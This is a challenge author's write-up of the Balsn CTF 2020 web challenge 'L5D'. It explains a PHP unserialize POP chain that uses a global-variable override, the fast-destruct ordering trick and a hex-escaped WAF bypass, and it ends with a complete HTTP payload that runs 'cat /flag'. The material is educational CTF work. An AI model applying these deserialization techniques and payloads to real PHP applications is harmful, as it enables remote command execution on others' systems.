# Balsn CTF 2020 

# L5D

- Difficulty: ★★
- Type: Web
- Solved: 17 / 490
- Tag: Warmup, PHP, Unserialize, POP chain

## Description

「Taking L5D was a profound experience, one of the most important things in my life.」

Try this new Unserialize-Oriented Programming System a.k.a. L5D !

http://l5d.balsnctf.com:12345/index.php

PHP Version: 7.0.33

Author: kaibro


## Source Code

- [L5D](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2020/src/)

Easter egg: My source code is just 420 line ;p

## Solution


In this challenge, there are 5 classes that contain some magic methods like `__wakeup`, `__destruct`.

And we have a arbitrary unserialize entry point:

```php
$wtf = waf($_GET{'?'}) ? $_GET['?'] : (finalize() && die("Nice try!"));
if($goodshit = @unserialize($wtf)) {
    $is_unser_finished = true;
}
```

So our target is to chain these classes' magic method to read the `/flag` file.

And most of the classes didn't have any property (only global variable), so it is hard to do pop chain (Property Oriented Programming) exploit.

But we can use `Array` to chain these classes together, like this:

```
Array(classA, classB, classC, ...);
```

It will unserialize multiple classes at the same time, and then the magic methods of these classes will be called.

Next, we should find a path to read flag.

The `L5D_Command` class is an attractive target, its `__destruct()` will run system command with global variable `cmd`.

And the `L5D_ResetCMD` class can reset the `cmd` variable by `new_cmd` property, but we should set our `$_SESSION['name']` to `wubalubadubdub` first:

```php
if($_SESSION['name'] === 'wubalubadubdub') {
    $cmd = $this->new_cmd;
}
```

In `L5D_Login` class, you can set the right session name, but you need to know the flag content first. It is impossible. We should find another way to exploit.

Let's take a look at the `L5D_Upload` class, this class has an obvious variable override vulnerability:

```php
foreach ($_FILES as $key => $value)
    $GLOBALS[$key] = $value;
```

We can overwrite any global variable to a file array (with some information that we uploaded).

So we can use this vulnerability to override the `$_SESSION` variable by upload a file with key `_SESSION`.

And everybody knows that `$_FILES`'s value looks like:

```
Array('name' => 'xxx', 'tmp_name' => 'xxx', 'size' => 'xxx' ...)
```

It can just overwrite the `$_SESSION['name']`, and the `name` is our uploaded filename!

(Note: you should upload a valid image file, or it will call `finalize()` to destroy your `$_SESSION` and `$cmd`)

So final exploit chain is:

1. `L5D_Upload` overwrite `$_SESSION['name']` to `wubalubadubdub`
2. `L5D_ResetCMD` reset `$cmd` to `cat /flag`
3. `L5D_Command` call `system($cmd)`

But there is still a small problem, lots of `__wakeup()` function will destroy your session or some important global variable in the process of unserialization. These variables will make your exploit failed.

An easy way to control order of `__wakeup()` and `__destruct()` is to use the [Fast Destruct](https://github.com/ambionics/phpggc#fast-destruct) trick.
It means that if you define two same key in an array, the first one object will be destroyed (it will call `__destruct()`) in the process of deserilization.
So you don't need to wait until the program ends to call `__destruct()`.

Finally, one of a valid exploit chain looks like this:

```
Array(0=>L5D_Command, 1=>L5D_ResetCMD, 2=>L5D_Upload, 2=>L5D_SayMyName, 3=>L5D_Login, 3=>L5D_SayMyName, 1=>L5D_SayMyName)
```

I use a useless `L5D_SayMyName` class to destroy other object with same key.

So the executing order of above exploit chain is:

1. `L5D_Command` wakeup
2. `L5D_ResetCMD` wakeup
3. `L5D_Upload` wakeup
4. `L5D_SayMyName` wakeup and `L5D_Upload` destroy
5. `L5D_Login` wakeup
6. `L5D_SayMyName` wakeup and `L5D_Login` destroy
7. `L5D_SayMyName` wakeup and `L5D_ResetCMD` destroy
8. Program End
9. `L5D_Command` destroy and other `L5D_SayMyName` destroy

And the final part, `waf()` function will block `*` character.
We should bypass this restriction to control the `$new_cmd` variable in `L5D_ResetCMD` class.

There is a small [trick](https://github.com/ambionics/phpggc#ascii-strings) can help us. If we change the type specifier of string from `s` to `S`, then we can use `\xx` hex representation in serialization data.

`s:10:"%00*%00new_cmd"` => `S:10:"\00\2A\00new_cmd%"`

Final payload:

```
POST /?%3f=a:7:{i:0;O:11:%22L5D_Command%22:0:{}i:1;O:12:%22L5D_ResetCMD%22:1:{S:10:%22%5C00%5C2A%5C00new_cmd%22;s:9:%22cat%20/flag%22;}i:2;O:10:%22L5D_Upload%22:0:{}i:2;O:13:%22L5D_SayMyName%22:0:{}i:3;O:9:%22L5D_Login%22:0:{}i:1;O:13:%22L5D_SayMyName%22:0:{}i:3;O:13:%22L5D_SayMyName%22:0:{}} HTTP/1.1
Host: l5d.balsnctf.com:12345
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148
Content-Type: multipart/form-data; boundary=---------------------------133915844616073813622061755521
Content-Length: 840
Cookie: PHPSESSID=dq2t165cscptkm24vb57e5f872
X-Forwarded-For: 127.0.0.1
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------133915844616073813622061755521
Content-Disposition: form-data; name="l5d_file"; filename="php.jpg"
Content-Type: image/jpeg

{IMAGE DATA}
-----------------------------133915844616073813622061755521
Content-Disposition: form-data; name="_SESSION"; filename="wubalubadubdub"
Content-Type: image/jpeg

aaa
-----------------------------133915844616073813622061755521
Content-Disposition: form-data; name="submit"

Upload Image
-----------------------------133915844616073813622061755521--
```

(Note: This is not the only one exploit chain :D)

<br>
<br>


BTW

Actually, this is just a warmup challenge compared to other web challenge.

But some china teams said this challenge is too easy in the feedback.

Maybe I should prepare a more complex (or harder) warmup challenge next year XD? (flee


## Writeups

- [The Flat Network Society
](https://github.com/TFNS/writeups/tree/master/2020-11-14-BalsnCTF/l5d)
- [Super Gusser](https://github.com/Super-Guesser/ctf/tree/master/BalsnCTF2020/web/L5D)
- [安全客](https://www.anquanke.com/post/id/222675#h2-1)
- [RB363](https://blog.rb363.tw/2020/12/04/Balsn-CTF-2020-L5D/)
- [10sec](https://hackmd.io/@raagi/ByGN2tk9P#Web--471---L5D)
